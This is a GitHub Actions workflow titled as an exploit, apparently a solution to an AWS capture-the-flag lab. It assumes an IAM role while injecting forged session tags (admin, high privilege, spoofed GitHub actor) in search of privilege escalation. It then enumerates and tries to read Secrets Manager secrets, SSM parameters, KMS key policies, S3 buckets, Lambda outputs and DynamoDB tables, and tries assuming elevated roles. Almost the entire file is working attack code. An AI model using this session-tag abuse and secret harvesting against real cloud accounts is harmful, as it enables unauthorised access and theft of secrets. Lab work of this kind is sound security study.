name: Session Tags Specific Exploit

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  session-tags-exploit:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    strategy:
      matrix:
        tag_combination:
          - name: "admin-tags"
            tags: |
              Key=Department,Value=Admin
              Key=Role,Value=Administrator
              Key=Level,Value=Admin
              Key=Privilege,Value=High
          - name: "github-specific"
            tags: |
              Key=github:actor,Value=admin
              Key=github:repository,Value=whitebox-lab-2
              Key=github:ref,Value=main
              Key=source,Value=github-actions
          - name: "lab-specific"
            tags: |
              Key=lab,Value=whitebox-lab-2
              Key=exercise,Value=session-tags
              Key=flag,Value=accessible
              Key=exploit,Value=true
          - name: "resource-based"
            tags: |
              Key=ResourceTag:Environment,Value=production
              Key=ResourceTag:Owner,Value=security-team
              Key=ResourceTag:Sensitive,Value=true
              Key=PrincipalTag:Department,Value=Security
    steps:
      - name: Checkout code
        uses: actions/checkout@v3

      - name: Configure AWS credentials with matrix session tags
        uses: aws-actions/configure-aws-credentials@v2
        with:
          role-to-assume: arn:aws:iam::067186171322:role/whitebox-lab-2-github-actions-role
          aws-region: us-east-1
          role-session-tags: ${{ matrix.tags }}

      - name: Test current configuration
        run: |
          echo "Testing with tag combination: ${{ matrix.tag_combination.name }}"
          echo "Current identity:"
          aws sts get-caller-identity

      - name: Test secret access with this tag combination
        run: |
          echo "Testing secrets with ${{ matrix.tag_combination.name }} tags..."
          
          # Test all possible secret variations
          for secret in "flag_whitebox_lab_2_2" "whitebox-lab-2-flag" "github-flag" "session-tags-flag" "admin-flag" "flag-${{ matrix.tag_combination.name }}"; do
            echo "Testing secret: $secret"
            aws secretsmanager get-secret-value --secret-id "$secret" && echo "SUCCESS: $secret accessible with ${{ matrix.tag_combination.name }}" || echo "Failed: $secret"
          done

      - name: Test KMS operations with these tags
        run: |
          echo "Testing KMS operations with ${{ matrix.tag_combination.name }} tags..."
          
          # Test the exposed KMS key
          aws kms describe-key --key-id arn:aws:kms:us-east-1:067186171322:key/1abf4a91-4a84-4395-b54c-43b6c6b60593 && echo "KMS describe successful" || echo "KMS describe failed"
          
          # Test KMS operations that require specific permissions
          aws kms get-key-policy --key-id arn:aws:kms:us-east-1:067186171322:key/1abf4a91-4a84-4395-b54c-43b6c6b60593 --policy-name default && echo "KMS get-policy successful" || echo "KMS get-policy failed"
          
          # Test decrypt operation (if there's encrypted data)
          echo "VGVzdCBkYXRh" | base64 -d > /tmp/test-data
          aws kms encrypt --key-id arn:aws:kms:us-east-1:067186171322:key/1abf4a91-4a84-4395-b54c-43b6c6b60593 --plaintext fileb:///tmp/test-data --output text --query CiphertextBlob | base64 -d > /tmp/encrypted-data 2>/dev/null || echo "KMS encrypt failed"
          
          if [ -f /tmp/encrypted-data ]; then
            aws kms decrypt --ciphertext-blob fileb:///tmp/encrypted-data --output text --query Plaintext | base64 -d && echo "KMS decrypt successful" || echo "KMS decrypt failed"
          fi

      - name: Test resource-based policy access
        run: |
          echo "Testing resource-based policies with ${{ matrix.tag_combination.name }} tags..."
          
          # Test Lambda functions that might have resource-based policies
          for func in "whitebox-lab-2-flag-function" "session-tags-function" "github-actions-function" "admin-function"; do
            echo "Testing Lambda function: $func"
            aws lambda get-function --function-name "$func" && echo "Lambda get-function successful for $func" || echo "Lambda get-function failed for $func"
            aws lambda invoke --function-name "$func" /tmp/output-$func-${{ matrix.tag_combination.name }}.json && echo "Lambda invoke successful for $func" || echo "Lambda invoke failed for $func"
            if [ -f /tmp/output-$func-${{ matrix.tag_combination.name }}.json ]; then
              echo "Output from $func:"
              cat /tmp/output-$func-${{ matrix.tag_combination.name }}.json
            fi
          done

      - name: Test S3 bucket policies with session tags
        run: |
          echo "Testing S3 access with ${{ matrix.tag_combination.name }} tags..."
          
          # Test various S3 operations that might be allowed with specific session tags
          aws s3api list-buckets && echo "S3 list-buckets successful" || echo "S3 list-buckets failed"
          
          # Test bucket-specific operations
          for bucket in "whitebox-lab-2-admin-bucket" "whitebox-lab-2-github-bucket" "whitebox-lab-2-session-tags-bucket"; do
            echo "Testing S3 bucket: $bucket"
            aws s3 ls s3://$bucket/ && echo "S3 ls successful for $bucket" || echo "S3 ls failed for $bucket"
            aws s3api get-bucket-policy --bucket $bucket && echo "S3 get-bucket-policy successful for $bucket" || echo "S3 get-bucket-policy failed for $bucket"
          done

      - name: Test assume role with session tags
        run: |
          echo "Testing assume role operations with ${{ matrix.tag_combination.name }} tags..."
          
          # Try to assume roles that might have tag-based trust policies
          for role in "whitebox-lab-2-admin-role" "whitebox-lab-2-flag-role" "whitebox-lab-2-session-tags-role" "github-actions-elevated-role"; do
            echo "Testing role assumption: $role"
            aws sts assume-role \
              --role-arn "arn:aws:iam::067186171322:role/$role" \
              --role-session-name "github-actions-${{ matrix.tag_combination.name }}" \
              --duration-seconds 900 && echo "Assume role successful for $role" || echo "Assume role failed for $role"
          done

      - name: Test comprehensive flag search
        run: |
          echo "Comprehensive flag search with ${{ matrix.tag_combination.name }} tags..."
          
          # Try parameter store with various paths
          for param in "/flag" "/whitebox-lab-2/flag" "/github-actions/flag" "/session-tags/flag" "/${{ matrix.tag_combination.name }}/flag"; do
            echo "Testing parameter: $param"
            aws ssm get-parameter --name "$param" && echo "Parameter successful: $param" || echo "Parameter failed: $param"
          done
          
          # Try CloudFormation outputs that might contain flags
          aws cloudformation describe-stacks --query 'Stacks[].Outputs[?OutputKey==`Flag`]' && echo "CloudFormation flag output found" || echo "CloudFormation flag output not found"
          
          # Try DynamoDB tables that might exist
          aws dynamodb list-tables && echo "DynamoDB list successful" || echo "DynamoDB list failed"
          
          # If there are tables, try to scan them
          tables=$(aws dynamodb list-tables --query 'TableNames' --output text 2>/dev/null)
          for table in $tables; do
            echo "Scanning DynamoDB table: $table"
            aws dynamodb scan --table-name "$table" --max-items 10 && echo "DynamoDB scan successful for $table" || echo "DynamoDB scan failed for $table"
          done
